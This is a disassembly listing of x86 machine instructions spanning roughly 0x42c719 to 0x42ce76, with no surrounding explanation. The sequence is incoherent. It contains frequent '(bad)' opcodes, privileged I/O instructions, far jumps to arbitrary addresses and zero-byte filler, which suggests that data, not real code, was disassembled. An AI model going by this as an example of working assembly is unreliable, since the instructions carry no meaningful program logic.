  42c719:	fld    QWORD PTR [ecx]
  42c71b:	retf   0xec39
  42c71e:	mov    ebp,ebp
  42c720:	fcmovu st,st(5)
  42c722:	repz inc edi
  42c724:	aad    0x69
  42c726:	xor    eax,0xe6c463fe
  42c72b:	(bad)  
  42c72c:	shl    BYTE PTR [ebp+0x59],1
  42c72f:	sar    DWORD PTR [ecx+0x6bfab18b],1
  42c735:	les    eax,FWORD PTR [eax]
  42c737:	add    BYTE PTR [eax],al
  42c739:	add    BYTE PTR [eax],al
  42c73b:	leave  
  42c73c:	pop    es
  42c73d:	aas    
  42c73e:	fisubr WORD PTR [ebp+ebx*8-0x563709c]
  42c745:	xor    eax,0xf6ea61dd
  42c74a:	inc    ebx
  42c74b:	jne    0x42c7ca
  42c74d:	mov    ds:0xe9055aec,al
  42c752:	add    edi,edx
  42c754:	inc    esi
  42c755:	jne    0x42c6e2
  42c757:	mov    ah,0x1a
  42c759:	add    BYTE PTR [edx-0x46],ah
  42c75c:	into   
  42c75d:	mov    BYTE PTR [edi],ah
  42c75f:	inc    ebp
  42c760:	mov    DWORD PTR [ecx+esi*8-0x11],eax
  42c764:	inc    edx
  42c765:	xor    BYTE PTR [ecx-0x7e],dl
  42c768:	pop    esi
  42c769:	sti    
  42c76a:	push   esi
  42c76b:	test   al,al
  42c76d:	repnz aam 0xca
  42c770:	xchg   DWORD PTR [ecx+eax*2-0x5c],eax
  42c774:	jnp    0x42c7ef
  42c776:	or     esi,ebp
  42c778:	inc    edx
  42c779:	and    al,0x60
  42c77b:	mov    edx,DWORD PTR [esi]
  42c77d:	sti    
  42c77e:	aam    0xca
  42c780:	(bad)  
  42c781:	aas    
  42c782:	jmp    0x9f7b94ec
  42c787:	pop    edx
  42c788:	push   edi
  42c789:	push   ds
  42c78a:	mov    esi,0xe533569
  42c78f:	mov    ds:0x76a91114,al
  42c794:	jnp    0x42c7d7
  42c796:	mov    ebp,0xd874c57d
  42c79b:	dec    ecx
  42c79c:	ficomp DWORD PTR [edi+0x4]
  42c79f:	add    BYTE PTR [eax],al
  42c7a1:	add    BYTE PTR [eax],al
  42c7a3:	add    BYTE PTR [eax+0x3cd152cb],ch
  42c7a9:	out    0xfa,eax
  42c7ab:	fimul  WORD PTR [esp+ecx*8]
  42c7ae:	push   edi
  42c7af:	ret    0xcbd1
  42c7b2:	jno    0x42c7c1
  42c7b4:	dec    eax
  42c7b5:	imul   DWORD PTR [edi-0x72fd4925]
  42c7bb:	pop    ds
  42c7bc:	jns    0x42c745
  42c7be:	(bad)  
  42c7bf:	icebp  
  42c7c0:	cmp    DWORD PTR [esi+ebx*1+0x5c],edx
  42c7c4:	mov    ebx,0x203950fa
  42c7c9:	mul    DWORD PTR [ebx-0x7afd4908]
  42c7cf:	test   eax,0xc80ffca
  42c7d4:	jns    0x42c7a5
  42c7d6:	(bad)  
  42c7d7:	dec    DWORD PTR [esp+eax*1]
  42c7da:	je     0x42c7e6
  42c7dc:	fwait
  42c7dd:	repnz not BYTE PTR ds:0x3ad320
  42c7e4:	xchg   ebp,eax
  42c7e5:	jmp    0x7e83:0x29213b38
  42c7ec:	adc    BYTE PTR [ebx],dl
  42c7ee:	dec    esi
  42c7ef:	push   0x3d4db6
  42c7f4:	mov    ah,0x3
  42c7f6:	add    BYTE PTR [eax],cl
  42c7f8:	int3   
  42c7f9:	fistp  DWORD PTR [ebp+0x7eae9aad]
  42c7ff:	rcl    BYTE PTR [ecx],0xfb
  42c802:	popa   
  42c803:	add    BYTE PTR [ebp*4+0xffde],dh
  42c80a:	add    BYTE PTR [eax],al
  42c80c:	add    BYTE PTR [ebx-0x814ffa7],bl
  42c812:	repnz not BYTE PTR [edi+0x74]
  42c816:	mov    cl,0xde
  42c818:	(bad)  
  42c819:	jnp    0x42c831
  42c81b:	call   0xf5f1390c
  42c820:	xor    ecx,DWORD PTR [ebx+eax*2-0x1d]
  42c824:	adc    DWORD PTR [ebx+0x7be8f435],ecx
  42c82a:	out    0xf5,eax
  42c82c:	inc    DWORD PTR [ebx-0x22]
  42c82f:	xlat   BYTE PTR ds:[ebx]
  42c830:	in     al,0x9b
  42c832:	stos   DWORD PTR es:[edi],eax
  42c833:	jns    0x42c7fd
  42c835:	dec    ebx
  42c836:	or     edx,DWORD PTR [esi+0x5b]
  42c839:	adc    eax,0x81fffec8
  42c83e:	jg     0x42c826
  42c840:	push   ecx
  42c841:	jge    0x42c85a
  42c843:	dec    edi
  42c844:	lea    ecx,[edx-0x6676b102]
  42c84a:	scas   al,BYTE PTR es:[edi]
  42c84b:	cmc    
  42c84c:	adc    eax,0x3ad874
  42c851:	pop    ds
  42c852:	nop
  42c853:	aaa    
  42c854:	pop    esi
  42c855:	jne    0x42c818
  42c857:	dec    edx
  42c858:	je     0x42c858
  42c85a:	sub    BYTE PTR es:[edi],dh
  42c85d:	ss int 0x67
  42c860:	mov    DWORD PTR [eax+0x12324e4d],edi
  42c866:	pop    ds
  42c867:	adc    BYTE PTR [edi-0x31ee6a4d],al
  42c86d:	or     ch,BYTE PTR [edi+0x8922]
  42c873:	add    BYTE PTR [eax],al
  42c875:	add    BYTE PTR [ebx-0x7e31950b],ah
  42c87b:	fdiv   QWORD PTR [eax]
  42c87d:	xor    dh,bh
  42c87f:	xor    bl,BYTE PTR ds:0x268d6d5b
  42c885:	sti    
  42c886:	and    cl,0xf1
  42c889:	aas    
  42c88a:	jne    0x42c890
  42c88c:	aas    
  42c88d:	or     BYTE PTR [eax+0x75037339],cl
  42c893:	ins    BYTE PTR es:[edi],dx
  42c894:	out    dx,al
  42c895:	cli    
  42c896:	xor    ch,ch
  42c898:	mov    al,BYTE PTR [ecx+esi*4-0x4d]
  42c89c:	inc    eax
  42c89d:	sub    al,0x27
  42c89f:	and    edx,edi
  42c8a1:	je     0x42c840
  42c8a3:	repz and eax,0x37527a89
  42c8a9:	add    al,0xfc
  42c8ab:	ja     0x42c8b3
  42c8ad:	xchg   DWORD PTR [ebx],esi
  42c8af:	xchg   ebp,eax
  42c8b0:	imul   eax,eax,0x2840dc6a
  42c8b6:	psubusb mm5,QWORD PTR [esi]
  42c8b9:	sti    
  42c8ba:	call   0xb9579ea2
  42c8bf:	aad    0x3e
  42c8c1:	add    dh,dh
  42c8c3:	lahf   
  42c8c4:	add    bh,bl
  42c8c6:	loopne 0x42c88b
  42c8c8:	aad    0x14
  42c8ca:	jno    0x42c875
  42c8cc:	add    BYTE PTR ds:0xaa08e9db,al
  42c8d3:	add    ah,BYTE PTR [edx+0x28f05ef0]
  42c8d9:	add    al,0x0
  42c8db:	add    BYTE PTR [eax],al
  42c8dd:	add    BYTE PTR [eax],al
  42c8df:	arpl   dx,ax
  42c8e1:	xor    DWORD PTR [edi],edi
  42c8e3:	cmp    al,0xc1
  42c8e5:	in     al,0x3
  42c8e7:	enter  0x9479,0x86
  42c8eb:	push   cs
  42c8ec:	repz adc eax,0x72483733
  42c8f2:	add    ecx,DWORD PTR [esi]
  42c8f4:	clc    
  42c8f5:	shl    dh,1
  42c8f7:	inc    edx
  42c8f8:	add    ch,BYTE PTR [esi-0x25]
  42c8fb:	jmp    0xfc76ba44
  42c900:	inc    edi
  42c901:	pop    ecx
  42c902:	fiadd  DWORD PTR [ecx+0x7543f6ea]
  42c908:	adc    DWORD PTR [esi],ebx
  42c90a:	mov    WORD PTR [ecx],?
  42c90c:	retf   0x39ff
  42c90f:	mov    eax,ds:0x318eb254
  42c914:	cli    
  42c915:	gs ret 
  42c917:	jbe    0x42c994
  42c919:	stos   DWORD PTR es:[edi],eax
  42c91a:	iret   
  42c91b:	in     eax,dx
  42c91c:	das    
  42c91d:	icebp  
  42c91e:	mov    ?,WORD PTR [edx+ebx*1]
  42c921:	jg     0x42c919
  42c923:	stc    
  42c924:	inc    esi
  42c925:	icebp  
  42c926:	push   DWORD PTR [edx]
  42c928:	int    0x7b
  42c92a:	iret   
  42c92b:	lahf   
  42c92c:	mul    DWORD PTR [eax+0x660252f1]
  42c932:	mov    edi,0x5028877e
  42c937:	ss jns 0x42c964
  42c93a:	adc    al,0x7a
  42c93c:	inc    esi
  42c93d:	icebp  
  42c93e:	xor    ecx,0xfffffffe
  42c941:	call   0x42c994
  42c946:	add    BYTE PTR [eax],al
  42c948:	jns    0x42c95b
  42c94a:	mov    al,ds:0x307b7a8b
  42c94f:	add    ah,ch
  42c951:	cmp    ecx,esi
  42c953:	in     al,dx
  42c954:	fwait
  42c955:	jns    0x42c956
  42c957:	loopne 0x42c924
  42c959:	mov    edx,0xaff1dd73
  42c95e:	es mov eax,0xfa87d6f6
  42c964:	jbe    0x42c968
  42c966:	outs   dx,BYTE PTR ds:[esi]
  42c967:	hlt    
  42c968:	dec    ebp
  42c969:	or     eax,0x2a220304
  42c96e:	mov    ecx,eax
  42c970:	jg     0x42c9ac
  42c972:	add    al,0xfb
  42c974:	jle    0x42c9f1
  42c976:	ja     0x42c959
  42c978:	inc    DWORD PTR [esp+eax*1-0x7e]
  42c97c:	jne    0x42c9cb
  42c97e:	pusha  
  42c97f:	icebp  
  42c980:	jbe    0x42c942
  42c982:	inc    esp
  42c983:	pop    esi
  42c984:	jbe    0x42c94f
  42c986:	inc    esp
  42c987:	push   ecx
  42c988:	clc    
  42c989:	inc    ebp
  42c98a:	clc    
  42c98b:	push   0xffffffa2
  42c98d:	cli    
  42c98e:	or     ebp,DWORD PTR [edx-0x50]
  42c991:	out    dx,eax
  42c992:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42c994:	call   0xfad2:0x3a368d5c
  42c99b:	aam    0xca
  42c99d:	(bad)  
  42c99e:	aas    
  42c99f:	jmp    0xbf3e0f8c
  42c9a4:	jno    0x42c961
  42c9a6:	mov    ebp,0x873776e1
  42c9ab:	std    
  42c9ac:	add    BYTE PTR [eax],al
  42c9ae:	add    BYTE PTR [eax],al
  42c9b0:	add    cl,bh
  42c9b2:	loopne 0x42c9ab
  42c9b4:	push   0xffffff8d
  42c9b6:	cld    
  42c9b7:	xchg   dl,ch
  42c9b9:	add    DWORD PTR [ebp-0x70],ecx
  42c9bc:	call   0x6094cc37
  42c9c1:	xor    eax,0x31720c26
  42c9c6:	push   cs
  42c9c7:	push   ebx
  42c9c8:	jo     0x42c97c
  42c9ca:	es adc al,0x6a
  42c9cd:	cmp    al,0xc9
  42c9cf:	push   ecx
  42c9d0:	inc    ebx
  42c9d1:	jns    0x42ca50
  42c9d3:	inc    ebx
  42c9d4:	add    BYTE PTR [eax-0x32],ch
  42c9d7:	dec    edx
  42c9d8:	push   0x5e
  42c9da:	stos   DWORD PTR es:[edi],eax
  42c9db:	adc    edi,esp
  42c9dd:	sub    al,0x40
  42c9df:	add    BYTE PTR ds:0x14e,bh
  42c9e5:	pop    eax
  42c9e6:	idiv   DWORD PTR [edx-0x8]
  42c9e9:	sbb    eax,0x1ca184fb
  42c9ee:	add    BYTE PTR [eax],al
  42c9f0:	cmp    DWORD PTR [eax+0x22],0x8
  42c9f4:	add    bh,bl
  42c9f6:	mov    edi,0x4387c8b
  42c9fb:	mov    ds:0x4ffe5f8d,eax
  42ca00:	jmp    FWORD PTR [ecx]
  42ca02:	enter  0x400c,0xc
  42ca06:	jg     0x42ca41
  42ca08:	and    BYTE PTR [ecx-0x41],bl
  42ca0b:	outs   dx,BYTE PTR ds:[esi]
  42ca0c:	and    dl,BYTE PTR [edi+0x3e]
  42ca0f:	and    al,0x85
  42ca11:	xchg   ebp,eax
  42ca12:	cmp    edx,DWORD PTR [ebx]
  42ca14:	push   ecx
  42ca15:	add    BYTE PTR [eax],al
  42ca17:	add    BYTE PTR [eax],al
  42ca19:	add    ah,bh
  42ca1b:	xlat   BYTE PTR ds:[ebx]
  42ca1c:	ins    DWORD PTR es:[edi],dx
  42ca1d:	jecxz  0x42c9b2
  42ca1f:	stos   BYTE PTR es:[edi],al
  42ca20:	cmp    eax,0x89244657
  42ca26:	sbb    ah,ch
  42ca28:	or     eax,DWORD PTR [ebp-0x41f9c36d]
  42ca2e:	sbb    al,0x3a
  42ca30:	or     al,BYTE PTR [eax]
  42ca32:	ja     0x42ca36
  42ca34:	cmp    DWORD PTR [eax+edi*4-0x9],0x7a
  42ca39:	into   
  42ca3a:	jae    0x42c9c0
  42ca3c:	cmp    DWORD PTR [eax],ecx
  42ca3e:	in     al,dx
  42ca3f:	stos   BYTE PTR es:[edi],al
  42ca40:	adc    ebx,DWORD PTR [esi+ebp*4]
  42ca43:	aas    
  42ca44:	add    BYTE PTR [ebp+0x538c3c93],al
  42ca4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ca4c:	stc    
  42ca4d:	call   FWORD PTR [ebx+ecx*2-0x45]
  42ca51:	je     0x42cac8
  42ca53:	cmc    
  42ca54:	gs add dh,al
  42ca57:	shl    DWORD PTR [esi-0x1],0x5a
  42ca5b:	fnstcw WORD PTR [edx-0x41]
  42ca5e:	leave  
  42ca5f:	leave  
  42ca60:	shl    DWORD PTR [ebx-0x6f],1
  42ca63:	in     eax,0x29
  42ca65:	data16 jns 0x42caa7
  42ca68:	add    al,0x66
  42ca6a:	xchg   DWORD PTR [esi+ecx*1-0x2ce8b818],esp
  42ca71:	cli    
  42ca72:	jp     0x42ca9f
  42ca74:	aam    0xf2
  42ca76:	inc    ebx
  42ca77:	ror    ah,1
  42ca79:	adc    BYTE PTR [ebx],0xd9
  42ca7c:	jno    0x42caa1
  42ca7e:	add    BYTE PTR [eax],al
  42ca80:	add    BYTE PTR [eax],al
  42ca82:	add    BYTE PTR [ebp+0x5a],dh
  42ca85:	mov    edx,0xfea7ba7f
  42ca8a:	push   edx
  42ca8b:	or     eax,0xfafade3c
  42ca90:	xor    DWORD PTR [edx],edi
  42ca92:	sti    
  42ca93:	repnz sub edx,DWORD PTR [edx-0x138c581]
  42ca9a:	out    0xd3,al
  42ca9c:	fwait
  42ca9d:	xor    al,0x87
  42ca9f:	shl    BYTE PTR [ebp+0x6cfe4ebd],1
  42caa5:	sbb    cl,BYTE PTR [eax]
  42caa7:	fucom  st(2)
  42caa9:	sar    edx,1
  42caab:	ret    0xbec7
  42caae:	push   esi
  42caaf:	mov    bh,0xdc
  42cab1:	dec    BYTE PTR [esi+0x4b]
  42cab4:	push   eax
  42cab5:	aam    0x52
  42cab7:	clc    
  42cab8:	xchg   edx,eax
  42cab9:	push   es
  42caba:	dec    edi
  42cabb:	mov    ds:0x350df6d5,al
  42cac0:	fld    DWORD PTR [edi+0x9cc5d79]
  42cac6:	call   0xfb15c1dc
  42cacb:	adc    BYTE PTR [edx+0xf],0xe8
  42cacf:	sbb    DWORD PTR [edx],eax
  42cad1:	(bad)  
  42cad2:	(bad)  
  42cad3:	outs   dx,DWORD PTR ds:[esi]
  42cad4:	pop    ebp
  42cad5:	stc    
  42cad6:	cmp    esi,DWORD PTR [edi]
  42cad8:	add    ch,cl
  42cada:	lods   eax,DWORD PTR ds:[esi]
  42cadc:	dec    edi
  42cadd:	rol    BYTE PTR [edx+0xdc22334],1
  42cae3:	pop    ebp
  42cae4:	cmp    eax,edi
  42cae6:	(bad)  
  42cae7:	add    BYTE PTR [eax],al
  42cae9:	add    BYTE PTR [eax],al
  42caeb:	add    BYTE PTR [edi+0x5d],cl
  42caee:	loope  0x42cb2b
  42caf0:	aaa    
  42caf1:	add    ecx,ebp
  42caf3:	cmp    eax,0x32a04fad
  42caf8:	cs lock cld 
  42cafb:	icebp  
  42cafc:	push   0x2
  42cafe:	xor    dh,BYTE PTR [esi]
  42cb00:	retf   0x33c5
  42cb03:	mov    ecx,DWORD PTR [esi]
  42cb05:	test   BYTE PTR [edi+edx*1+0x32e90274],dl
  42cb0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb0d:	xor    DWORD PTR [esi+0x58],ebx
  42cb10:	ins    DWORD PTR es:[edi],dx
  42cb11:	jge    0x42caf4
  42cb13:	mov    ah,dl
  42cb15:	jb     0x42cafe
  42cb17:	add    esi,DWORD PTR [ebp-0x40]
  42cb1a:	mov    ds:0xab76ead6,eax
  42cb1f:	fbstp  TBYTE PTR [edx]
  42cb21:	jge    0x42cb74
  42cb23:	jmp    0x42cac1
  42cb25:	mov    DWORD PTR [ecx-0x2a],0x7fe9c2f6
  42cb2c:	sbb    DWORD PTR [ebx],eax
  42cb2e:	jmp    0x4182c636
  42cb33:	jmp    0x42cb6c
  42cb35:	jge    0x42cb58
  42cb37:	(bad)  
  42cb38:	sti    
  42cb39:	shl    BYTE PTR [ebp-0x2b],cl
  42cb3c:	test   al,0x4e
  42cb3e:	in     eax,dx
  42cb3f:	imul   eax,DWORD PTR [ebp-0x637d1e23],0x1b007bf1
  42cb49:	out    0xa0,al
  42cb4b:	jmp    0x0:0x29001488
  42cb52:	add    BYTE PTR [eax],al
  42cb54:	add    BYTE PTR [esi+0x77],al
  42cb57:	inc    esp
  42cb58:	inc    ecx
  42cb59:	or     al,0x2
  42cb5b:	push   eax
  42cb5c:	out    0x62,al
  42cb5e:	cmp    DWORD PTR [edx],edx
  42cb60:	sub    DWORD PTR [ecx+0x49],esi
  42cb63:	(bad)  
  42cb64:	in     eax,0xc0
  42cb66:	jnp    0x42cbdc
  42cb68:	xor    DWORD PTR [ebx-0xa1c8bc4],0xaf3414da
  42cb72:	pusha  
  42cb73:	adc    BYTE PTR [edx+eax*4-0x25],ah
  42cb77:	dec    edi
  42cb78:	pop    esp
  42cb79:	jp     0x42cb0d
  42cb7b:	dec    edi
  42cb7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb7d:	and    bh,BYTE PTR ds:0x49712912
  42cb83:	(bad)  
  42cb84:	in     eax,0xd
  42cb86:	add    eax,DWORD PTR [edi+0x447a0e24]
  42cb8c:	push   ebp
  42cb8d:	mov    bl,0x81
  42cb8f:	inc    esp
  42cb90:	sbb    BYTE PTR [edi+0xefcfb03],0x63
  42cb97:	shr    DWORD PTR [ecx+0x39747769],0x53
  42cb9e:	jnp    0x42cbe4
  42cba0:	xchg   ebx,eax
  42cba1:	fincstp 
  42cba3:	xchg   DWORD PTR [esi-0x38],edx
  42cba6:	aaa    
  42cba7:	push   0x279f9
  42cbac:	je     0x42cb40
  42cbae:	call   0x3686:0x9dd92f86
  42cbb5:	test   al,0x84
  42cbb7:	mov    edi,0xb4
  42cbbc:	add    BYTE PTR [eax],al
  42cbbe:	aaa    
  42cbbf:	pusha  
  42cbc0:	add    DWORD PTR [edx+esi*2-0x22],esi
  42cbc4:	dec    edi
  42cbc5:	jb     0x42cb7f
  42cbc7:	loopne 0x42cc07
  42cbc9:	adc    al,0xc8
  42cbcb:	retf   
  42cbcc:	mov    WORD PTR [esi+eiz*8+0x6c0044c3],ss
  42cbd3:	xchg   esi,eax
  42cbd4:	test   BYTE PTR [eax-0x64],al
  42cbd7:	fdiv   QWORD PTR [ecx+ecx*4+0x45f8ad8b]
  42cbde:	mov    eax,DWORD PTR [ebx+edi*2+0x79ff5fff]
  42cbe5:	inc    eax
  42cbe6:	dec    ebx
  42cbe7:	scas   eax,DWORD PTR es:[edi]
  42cbe8:	cmc    
  42cbe9:	xor    cl,BYTE PTR [edi+ecx*1]
  42cbec:	push   esi
  42cbed:	pop    ebx
  42cbee:	adc    eax,0xa60002c2
  42cbf3:	add    ecx,DWORD PTR [ebp-0x7cebcfbb]
  42cbf9:	div    DWORD PTR [edx*8-0x24f40005]
  42cc00:	rol    DWORD PTR [ebx+0x74fffa59],1
  42cc06:	jbe    0x42cc19
  42cc08:	lea    eax,[ebp-0x24]
  42cc0b:	fld    TBYTE PTR [ebp-0x7b511477]
  42cc11:	fsub   DWORD PTR [eax-0x597bfa76]
  42cc17:	add    eax,DWORD PTR [eax]
  42cc19:	add    BYTE PTR [edi+0xc98e7b6],dl
  42cc1f:	add    al,0x0
  42cc21:	push   0x0
  42cc23:	add    BYTE PTR [eax],al
  42cc25:	add    BYTE PTR [eax],al
  42cc27:	jmp    0x42cba9
  42cc29:	jnp    0x42cbef
  42cc2b:	mov    ah,0xdb
  42cc2d:	sub    esp,DWORD PTR [edi+0x4b]
  42cc30:	scas   al,BYTE PTR es:[edi]
  42cc31:	cmc    
  42cc32:	jne    0x42cbec
  42cc34:	xor    BYTE PTR [ebx-0xa51c538],0x6a
  42cc3b:	(bad)  
  42cc3d:	adc    al,0x15
  42cc3f:	int3   
  42cc40:	add    eax,DWORD PTR [ebx-0x4285678b]
  42cc46:	mov    DWORD PTR [ecx],esp
  42cc48:	pop    es
  42cc49:	idiv   edi
  42cc4b:	mov    eax,DWORD PTR [eax-0x768a73bd]
  42cc51:	out    0xbe,al
  42cc53:	out    dx,eax
  42cc54:	clc    
  42cc55:	rol    DWORD PTR [ebx+0xb1545b5],cl
  42cc5b:	ret    0x829e
  42cc5e:	inc    edi
  42cc5f:	sub    eax,0x8d7efa45
  42cc64:	scas   al,BYTE PTR es:[edi]
  42cc65:	dec    ecx
  42cc66:	add    ah,BYTE PTR [esi-0x4f769a67]
  42cc6c:	push   edi
  42cc6d:	add    DWORD PTR [ecx+eax*8-0x3a053150],0xa58c4926
  42cc78:	mov    cl,0xe6
  42cc7a:	nop
  42cc7b:	dec    edx
  42cc7c:	mov    BYTE PTR [edi+0x7fa8c9bf],al
  42cc82:	test   BYTE PTR [ecx-0x3a053168],bl
  42cc88:	dec    esi
  42cc89:	dec    ecx
  42cc8a:	les    eax,FWORD PTR [eax]
  42cc8c:	add    BYTE PTR [eax],al
  42cc8e:	add    BYTE PTR [eax],al
  42cc90:	lds    edx,FWORD PTR [esi-0x77]
  42cc93:	(bad)  
  42cc94:	and    esi,DWORD PTR [eax-0x32]
  42cc97:	dec    edi
  42cc98:	or     eax,0x12fff960
  42cc9d:	dec    esi
  42cc9e:	mov    edi,eax
  42cca0:	or     ecx,DWORD PTR [eax-0x31]
  42cca3:	dec    edi
  42cca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cca5:	add    DWORD PTR [esi*2-0x72c7268b],edx
  42ccac:	cmp    BYTE PTR [ecx],cl
  42ccae:	xor    al,0xe8
  42ccb0:	lods   eax,DWORD PTR ds:[esi]
  42ccb1:	dec    ebx
  42ccb2:	iret   
  42ccb3:	cli    
  42ccb4:	lock gs mov ebx,0x7a37daf9
  42ccbb:	xlat   BYTE PTR ds:[ebx]
  42ccbc:	ffree  st(5)
  42ccbe:	idiv   edi
  42ccc0:	retf   0x5953
  42ccc3:	or     BYTE PTR [edi-0x27],cl
  42ccc6:	jg     0x42cd0c
  42ccc8:	shr    DWORD PTR [eax-0x2a],1
  42cccb:	dec    ebx
  42cccc:	mov    cl,0x1
  42ccce:	and    dl,bl
  42ccd0:	stc    
  42ccd1:	dec    esp
  42ccd2:	cmp    ebx,ecx
  42ccd4:	cmp    DWORD PTR [edx+0x25a7e40],esi
  42ccda:	add    edi,eax
  42ccdc:	cli    
  42ccdd:	mov    BYTE PTR [ecx],0x7e
  42cce0:	retf   
  42cce1:	fcom   st(7)
  42cce3:	sar    BYTE PTR [edi-0x3a],cl
  42cce6:	fwait
  42cce7:	jle    0x42cc77
  42cce9:	cmp    ah,0xbf
  42ccec:	jns    0x42ccf0
  42ccee:	jmp    0xf4089329
  42ccf3:	jmp    0x42ccf5
  42ccf5:	add    BYTE PTR [eax],al
  42ccf7:	add    BYTE PTR [eax],al
  42ccf9:	jae    0x42cd3d
  42ccfb:	jmp    0x603d767e
  42cd00:	dec    eax
  42cd01:	popa   
  42cd02:	jp     0x42ccee
  42cd04:	rcr    BYTE PTR [edx],cl
  42cd06:	jae    0x42ccef
  42cd08:	add    esi,DWORD PTR [ebp+0x77]
  42cd0b:	sbb    esp,eax
  42cd0d:	rcl    BYTE PTR [edx],cl
  42cd0f:	xor    al,0x4
  42cd11:	jne    0x42cd6b
  42cd13:	in     eax,dx
  42cd14:	sub    ebx,DWORD PTR ds:0x1fd26b91
  42cd1a:	jg     0x42ccc4
  42cd1c:	pop    eax
  42cd1d:	jbe    0x42cd2f
  42cd1f:	test   eax,0xe9030bdc
  42cd24:	add    esi,edx
  42cd26:	cld    
  42cd27:	jns    0x42cd81
  42cd29:	ins    DWORD PTR es:[edi],dx
  42cd2a:	jns    0x42cd94
  42cd2c:	xor    DWORD PTR [ebp+0x2],0xffffffe9
  42cd30:	xchg   BYTE PTR [ecx-0x36],al
  42cd33:	popa   
  42cd34:	or     BYTE PTR [ecx-0x2e],0x50
  42cd38:	pop    ds
  42cd39:	fadd   st(7),st
  42cd3b:	push   ecx
  42cd3c:	xchg   DWORD PTR [edx],ebx
  42cd3e:	dec    edi
  42cd3f:	sub    edx,edx
  42cd41:	dec    ecx
  42cd42:	shr    BYTE PTR [ebp+0x48],cl
  42cd45:	rcr    edx,0xc7
  42cd48:	aas    
  42cd49:	jne    0x42cd4d
  42cd4b:	add    dl,bh
  42cd4d:	or     edi,DWORD PTR [ebx+0x44]
  42cd50:	inc    ecx
  42cd51:	add    DWORD PTR [ebp-0x3a2d88f6],0xfffffffa
  42cd58:	jmp    0x13765452
  42cd5d:	add    BYTE PTR [eax],al
  42cd5f:	add    BYTE PTR [eax],al
  42cd61:	add    bh,al
  42cd63:	enter  0x50e7,0x53
  42cd67:	add    al,BYTE PTR [eax]
  42cd69:	jb     0x42cda0
  42cd6b:	shl    BYTE PTR [ebp-0x18],cl
  42cd6e:	cmc    
  42cd6f:	jle    0x42cd3d
  42cd71:	mul    DWORD PTR [eax+ecx*8-0x31429db1]
  42cd78:	es sub al,0x49
  42cd7b:	fnstsw WORD PTR [eax-0x7]
  42cd7e:	inc    ebp
  42cd7f:	enter  0xd186,0x68
  42cd83:	int    0x73
  42cd85:	dec    ebp
  42cd86:	rol    BYTE PTR [eax],1
  42cd88:	xchg   DWORD PTR [ecx],ebp
  42cd8a:	inc    ebp
  42cd8b:	jp     0x42cde9
  42cd8d:	mov    ecx,0x3dec3f70
  42cd92:	outs   dx,DWORD PTR ds:[esi]
  42cd93:	inc    ebp
  42cd94:	dec    ebp
  42cd95:	mov    cl,0x44
  42cd97:	fcomp  QWORD PTR [ebx+0x3a]
  42cd9a:	leave  
  42cd9b:	mov    edx,0x3176e8ff
  42cda0:	call   0xfb0ae997
  42cda5:	sar    BYTE PTR [ecx],cl
  42cda7:	push   ecx
  42cda8:	add    eax,0x74f65ec0
  42cdad:	fisttp DWORD PTR [ecx+0x5c]
  42cdb0:	fs push ds
  42cdb2:	sbb    edx,edi
  42cdb4:	or     al,0x6e
  42cdb6:	les    ecx,FWORD PTR [ebx]
  42cdb8:	mov    edi,0x5809e0dd
  42cdbd:	in     eax,dx
  42cdbe:	dec    edx
  42cdbf:	not    DWORD PTR [edx+0x62]
  42cdc2:	scas   eax,DWORD PTR es:[edi]
  42cdc3:	(bad)  
  42cdc5:	push   ecx
  42cdc6:	add    BYTE PTR [eax],al
  42cdc8:	add    BYTE PTR [eax],al
  42cdca:	add    BYTE PTR [edi+eax*8-0x46e6ff78],ah
  42cdd1:	loope  0x42cdfb
  42cdd3:	inc    edi
  42cdd4:	mov    eax,0xb38107e2
  42cdd9:	cmc    
  42cdda:	push   ebx
  42cddb:	mov    ah,0x57
  42cddd:	sti    
  42cdde:	call   FWORD PTR [ebp+ebp*8-0x2f341741]
  42cde5:	clc    
  42cde6:	(bad)  
  42cde7:	fild   QWORD PTR [eax]
  42cde9:	cwde   
  42cdea:	add    BYTE PTR [eax+eax*1-0x1b9b3fd5],bl
  42cdf1:	paddd  mm0,QWORD PTR [ebx-0x7207bc47]
  42cdf8:	add    BYTE PTR [eax],al
  42cdfa:	add    BYTE PTR [ebx-0x15],ah
  42cdfd:	out    0x5c,eax
  42cdff:	xor    esi,DWORD PTR [ebx+0xa4457f5]
  42ce05:	xlat   BYTE PTR ds:[ebx]
  42ce06:	inc    DWORD PTR [ebx-0x4d]
  42ce09:	jae    0x42cdfb
  42ce0b:	xor    al,0x42
  42ce0d:	xlat   BYTE PTR ds:[ebx]
  42ce0e:	push   DWORD PTR [ebx]
  42ce10:	inc    edi
  42ce11:	add    edi,edi
  42ce13:	mov    DWORD PTR [esi+0x47544d81],esi
  42ce19:	jnp    0x42cd9b
  42ce1b:	sbb    eax,0x97e80000
  42ce20:	mov    bh,0xfb
  42ce22:	(bad)  
  42ce23:	aas    
  42ce24:	sar    BYTE PTR [ecx+0x7d],0x4
  42ce28:	add    DWORD PTR [edi],eax
  42ce2a:	xchg   esp,eax
  42ce2b:	fcom   QWORD PTR [edx]
  42ce2d:	push   ebx
  42ce2e:	leave  
  42ce2f:	add    BYTE PTR [eax],al
  42ce31:	add    BYTE PTR [eax],al
  42ce33:	add    dh,bl
  42ce35:	sti    
  42ce36:	jmp    FWORD PTR [ecx+0x28]
  42ce39:	test   al,0xf5
  42ce3b:	pop    es
  42ce3c:	or     al,0x0
  42ce3e:	push   eax
  42ce3f:	lea    ebx,[ebx-0x1600b006]
  42ce45:	pop    ss
  42ce46:	push   cs
  42ce47:	inc    eax
  42ce48:	int3   
  42ce49:	jle    0x42ce09
  42ce4b:	or     al,0x75
  42ce4d:	push   esi
  42ce4e:	mov    edi,0xc3e77a73
  42ce53:	call   0x41a80b
  42ce58:	jb     0x42cea6
  42ce5a:	dec    eax
  42ce5b:	sbb    al,0x26
  42ce5d:	adc    bp,bp
  42ce60:	dec    ebx
  42ce61:	mov    ebx,0x8521c50b
  42ce66:	jnp    0x42ceb3
  42ce68:	pop    ecx
  42ce69:	leave  
  42ce6a:	jnp    0x42ce74
  42ce6c:	adc    esi,DWORD PTR [edx-0x268be483]
  42ce72:	(bad)  
  42ce73:	je     0x42cea5
  42ce75:	outs   dx,DWORD PTR ds:[esi]
  42ce76:	std    
